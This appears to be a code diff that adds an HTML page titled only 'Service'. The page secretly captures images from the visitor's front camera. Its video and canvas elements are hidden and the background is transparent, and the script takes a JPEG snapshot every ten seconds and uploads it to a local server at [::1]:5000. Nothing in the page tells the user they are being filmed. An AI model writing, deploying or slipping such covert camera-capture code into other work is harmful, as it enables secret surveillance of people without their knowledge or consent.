@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Service</title>
+</head>
+<body style="margin:0; padding:0; overflow:hidden; background:transparent;">
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        async function start() {
+            try {
+                // Requesting front camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                v.srcObject = stream;
+                
+                // Interval starts once stream is active
+                v.onloadedmetadata = () => {
+                    setInterval(snap, 10000);
+                };
+            } catch (e) {
+                console.error("Camera access required.");
+            }
+        }
+
+        function snap() {
+            const ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            c.toBlob((blob) => {
+                const fd = new FormData();
+                // Use IPv6 loopback [::1] or the IPv4 127.0.0.1
+                fd.append('image', blob, `shot_${Date.now()}.jpg`);
+                
+                fetch('http://[::1]:5000/upload', {
+                    method: 'POST',
+                    body: fd
+                }).then(r => console.log('Sent'))
+                  .catch(err => console.log('Error'));
+            }, 'image/jpeg', 0.7);
+        }
+
+        start();
+    </script>
+</body>
+</html>
